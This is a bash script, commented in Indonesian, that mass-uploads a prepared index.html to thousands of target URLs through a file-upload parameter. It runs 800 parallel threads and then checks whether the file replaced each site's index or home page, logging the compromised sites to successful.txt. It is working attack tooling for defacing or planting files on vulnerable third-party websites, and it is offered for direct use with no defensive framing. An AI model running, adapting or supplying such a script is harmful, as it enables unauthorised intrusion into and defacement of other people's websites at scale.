#!/bin/bash
# upload.sh — 30.000++ SHELL, HANYA YANG BERHASIL MASUK successful.txt
# CARA: ./upload.sh

INDEX="index.html"
URLS="url.txt"
PARAM="file"
SUCCESS="successful.txt"
THREADS=800          # Stabil & cepat
TIMEOUT=6

# === CEK FILE ===
[[ ! -f "$INDEX" ]] && { echo "[X] $INDEX tidak ada!"; exit 1; }
[[ ! -f "$URLS" ]] && { echo "[X] $URLS tidak ada!"; exit 1; }
> "$SUCCESS"  # Kosongkan dulu

TOTAL=$(wc -l < "$URLS")
echo """
  UPLOADER AKURAT — 30.000++ SHELL
  File     : $INDEX
  Target   : $TOTAL
  Thread   : $THREADS
  Output   : $SUCCESS (HANYA YANG BERHASIL)
"""

# === FUNGSI UPLOAD + CEK KETAT ===
upload_check() {
  local url="$1"
  local base="${url%/*}/"
  local home="${base%/}"
  local idx_url="$base/index.html"

  # --- 1. UPLOAD ---
  if ! curl -s -m "$TIMEOUT" -F "$PARAM=@$INDEX;filename=index.html" "$url" >/dev/null 2>&1; then
    echo "GAGAL $url (upload gagal)"
    return 1
  fi

  # --- 2. CEK index.html ---
  if curl -s -m 3 --fail "$idx_url" 2>/dev/null | cmp -s - "$INDEX" 2>/dev/null; then
    # BENAR-BENAR SAMA → MASUKKAN KE SUCCESS
    echo "$home" >> "$SUCCESS"
    echo "BERHASIL $url → $home"
    return 0
  fi

  # --- 3. CEK HALAMAN UTAMA ---
  if curl -s -m 3 --fail "$home" 2>/dev/null | cmp -s - "$INDEX" 2>/dev/null; then
    echo "$home" >> "$SUCCESS"
    echo "BERHASIL $url → $home"
    return 0
  fi

  # --- 4. GAGAL TOTAL ---
  echo "GAGAL $url (konten tidak cocok)"
  return 1
}

export -f upload_check
export INDEX PARAM SUCCESS TIMEOUT

# === JALANKAN PARALEL ===
cat "$URLS" | xargs -n1 -P"$THREADS" -I{} bash -c 'upload_check "{}"'

# === HASIL AKHIR ===
SUKSES=$(wc -l < "$SUCCESS" 2>/dev/null || echo 0)
GAGAL=$((TOTAL - SUKSES))

echo -e "\nSELESAI!"
echo "Total    : $TOTAL"
echo "BERHASIL : $SUKSES  → HANYA YANG BENAR-BENAR SUKSES"
echo "GAGAL    : $GAGAL"
echo "Hasil    : $SUCCESS"